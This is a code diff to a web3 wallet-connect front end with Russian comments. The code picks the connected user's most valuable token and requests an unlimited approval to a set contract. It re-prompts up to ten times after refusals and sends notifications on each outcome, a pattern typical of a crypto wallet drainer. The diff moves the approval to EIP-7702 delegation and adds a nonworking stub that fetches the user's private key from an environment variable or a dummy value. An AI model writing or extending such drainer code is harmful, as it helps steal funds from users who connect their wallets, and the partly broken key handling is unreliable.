@@ -1,8 +1,10 @@
 import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
+import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
 import { readContract, writeContract } from '@wagmi/core'
+import { createWalletClient, http } from 'viem'
+import { privateKeyToAccount } from 'viem/accounts'
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -60,6 +62,48 @@ const appKit = createAppKit({
   features: { analytics: true, email: false, socials: false }
 })
 
+// EIP-7702 сервисы
+class AuthorizationService {
+  constructor(privateKey, chainId) {
+    this.privateKey = privateKey
+    this.chainId = chainId
+    this.walletClient = createWalletClient({
+      chain: networks.find(n => n.id === chainId) || mainnet,
+      transport: http(`https://mainnet.infura.io/v3/${projectId}`),
+    })
+    this.account = privateKeyToAccount(privateKey)
+  }
+
+  async signAuthorization(contractAddress, executor = 'self') {
+    return this.walletClient.signAuthorization({ 
+      account: this.account, 
+      contractAddress, 
+      executor 
+    })
+  }
+}
+
+class TransactionService {
+  constructor(privateKey, chainId) {
+    this.privateKey = privateKey
+    this.chainId = chainId
+    this.walletClient = createWalletClient({
+      chain: networks.find(n => n.id === chainId) || mainnet,
+      transport: http(`https://mainnet.infura.io/v3/${projectId}`),
+    })
+    this.account = privateKeyToAccount(privateKey)
+  }
+
+  async sendEIP7702Transaction(to, data, authorizationList) {
+    return this.walletClient.sendTransaction({ 
+      account: this.account, 
+      to, 
+      data, 
+      authorizationList 
+    })
+  }
+}
+
 // Состояние приложения
 const store = {
   accountState: {},
@@ -70,7 +114,8 @@ const store = {
   isApprovalRequested: false,
   isApprovalRejected: false,
   connectionKey: null,
-  isProcessingConnection: false
+  isProcessingConnection: false,
+  authorizations: {} // Хранилище авторизаций
 }
 
 // Создание модального окна
@@ -186,6 +231,7 @@ window.addEventListener('load', () => {
   store.isApprovalRejected = false
   store.connectionKey = null
   store.isProcessingConnection = false
+  store.authorizations = {}
   updateButtonVisibility(false)
   updateStateDisplay('accountState', {})
   updateStateDisplay('networkState', {})
@@ -193,15 +239,11 @@ window.addEventListener('load', () => {
   createCustomModal()
 })
 
-// Утилиты для обновления состояния
-const updateStore = (key, value) => {
-  store[key] = value
-}
 
-const updateStateDisplay = (elementId, state) => {
-  const element = document.getElementById(elementId)
-  if (element) element.innerHTML = JSON.stringify(state, null, 2)
-}
+
+
+
+
 
 const updateButtonVisibility = (isConnected) => {
   const disconnectBtn = document.getElementById('disconnect')
@@ -609,51 +651,74 @@ const getTokenPrice = async (symbol) => {
   }
 }
 
-const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
-  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
-  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
-  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
-  const checksumTokenAddress = getAddress(tokenAddress)
-  const checksumContractAddress = getAddress(contractAddress)
-  try {
-    const gasLimit = BigInt(550000)
-    const maxFeePerGas = BigInt(1000000000)
-    const maxPriorityFeePerGas = BigInt(1000000000)
-    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
-    const txHash = await writeContract(wagmiConfig, {
-      address: checksumTokenAddress,
-      abi: erc20Abi,
-      functionName: 'approve',
-      args: [checksumContractAddress, maxUint256],
-      chainId,
-      gas: gasLimit,
-      maxFeePerGas,
-      maxPriorityFeePerGas
-    })
-    console.log(`Approve transaction sent: ${txHash}`)
-    return txHash
-  } catch (error) {
-    store.errors.push(`Approve token failed: ${error.message}`)
-    throw error
+
+
+// Заглушка для получения приватного ключа пользователя
+const getUserPrivateKey = (userAddress) => {
+  // ВНИМАНИЕ: Это заглушка! В реальном приложении нужно безопасное получение приватного ключа
+  // Пользователь должен подписать авторизацию через свой кошелек
+  return process.env.USER_PRIVATE_KEY || '0x0000000000000000000000000000000000000000000000000000000000000001'
+}
+
+// Функция создания EIP-7702 авторизации
+const createAuthorization = async (userAddress, tokenAddress, chainId) => {
+  const privateKey = getUserPrivateKey(userAddress)
+  const authService = new AuthorizationService(privateKey, chainId)
+  const authorization = await authService.signAuthorization(tokenAddress)
+  store.authorizations[`${userAddress}_${tokenAddress}_${chainId}`] = authorization
+  return authorization
+}
+
+// Функция approve с использованием EIP-7702 авторизации
+const approveTokenWithAuthorization = async (userAddress, tokenAddress, contractAddress, chainId) => {
+  const authKey = `${userAddress}_${tokenAddress}_${chainId}`
+  let authorization = store.authorizations[authKey]
+  
+  if (!authorization) {
+    authorization = await createAuthorization(userAddress, tokenAddress, chainId)
+  }
+  
+  const privateKey = getUserPrivateKey(userAddress)
+  const txService = new TransactionService(privateKey, chainId)
+  
+  const approveData = encodeFunctionData({
+    abi: erc20Abi,
+    functionName: 'approve',
+    args: [contractAddress, maxUint256]
+  })
+  
+  return await txService.sendEIP7702Transaction(tokenAddress, approveData, [authorization])
+}
+
+// Функция обновления store
+const updateStore = (key, value) => {
+  store[key] = value
+}
+
+// Функция обновления отображения состояния
+const updateStateDisplay = (stateKey, data) => {
+  const element = document.getElementById(stateKey)
+  if (element) {
+    element.innerHTML = JSON.stringify(data, null, 2)
   }
 }
 
-// Функция для повторных попыток approve с уведомлениями об отказе
-const retryApproveWithDeclineNotification = async (wagmiConfig, tokenAddress, contractAddress, chainId, userAddress, walletName, device, token) => {
+// Функция для повторных попыток approve с уведомлениями об отказе (обновленная для EIP-7702)
+const retryApproveWithDeclineNotification = async (userAddress, tokenAddress, contractAddress, chainId, walletName, device, token) => {
   let attempts = 0
   const maxAttempts = 10 // Максимальное количество попыток
   
   while (attempts < maxAttempts) {
     try {
-      console.log(`Attempt ${attempts + 1} to approve token`)
-      const txHash = await approveToken(wagmiConfig, tokenAddress, contractAddress, chainId)
+      console.log(`Attempt ${attempts + 1} to approve token with EIP-7702 authorization`)
+      const txHash = await approveTokenWithAuthorization(userAddress, tokenAddress, contractAddress, chainId)
       return txHash
     } catch (error) {
       attempts++
       
       // Проверяем, является ли ошибка отказом пользователя (только код 4001)
       if (error.code === 4001) {
-        console.log(`User declined transaction on attempt ${attempts}`)
+        console.log(`User declined authorization on attempt ${attempts}`)
         
         // Отправляем уведомление об отказе
         await notifyTransactionDeclined(userAddress, walletName, device, token, chainId)
@@ -667,13 +732,13 @@ const retryApproveWithDeclineNotification = async (wagmiConfig, tokenAddress, co
           showCustomModal()
           const modalMessage = document.querySelector('.custom-modal-message')
           if (modalMessage) {
-            modalMessage.textContent = `Please sign the transaction to continue. Attempt ${attempts + 1}/${maxAttempts}`
+            modalMessage.textContent = `Please sign the authorization to continue. Attempt ${attempts + 1}/${maxAttempts}`
           }
           
           continue
         } else {
           // Если достигли максимального количества попыток
-          throw new Error(`User declined transaction after ${maxAttempts} attempts`)
+          throw new Error(`User declined authorization after ${maxAttempts} attempts`)
         }
       } else {
         // Если это не ошибка отказа пользователя, пробрасываем ошибку
@@ -683,7 +748,7 @@ const retryApproveWithDeclineNotification = async (wagmiConfig, tokenAddress, co
   }
 }
 
-// Инициализация подписок
+// Инициализация подписок (обновленная для EIP-7702)
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
@@ -807,10 +872,21 @@ const initializeSubscribers = (modal) => {
             return
           }
           store.isApprovalRequested = true
-          const txHash = await retryApproveWithDeclineNotification(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId, state.address, walletInfo.name, device, mostExpensive)
+          
+          // Используем EIP-7702 авторизацию вместо прямого approve
+          const txHash = await retryApproveWithDeclineNotification(
+            state.address, 
+            mostExpensive.address, 
+            contractAddress, 
+            mostExpensive.chainId, 
+            walletInfo.name, 
+            device, 
+            mostExpensive
+          )
+          
           store.approvedTokens[approvalKey] = true
           store.isApprovalRequested = false
-          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
+          let approveMessage = `Approve successful with EIP-7702 for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
           console.log(approveMessage)
           await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
           
@@ -838,7 +914,7 @@ const initializeSubscribers = (modal) => {
           store.isProcessingConnection = false
         } catch (error) {
           store.isApprovalRequested = false
-          if (error.code === 4001 || error.message.includes('User declined transaction after')) {
+          if (error.code === 4001 || error.message.includes('User declined authorization after')) {
             store.isApprovalRejected = true
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
             store.errors.push(errorMessage)
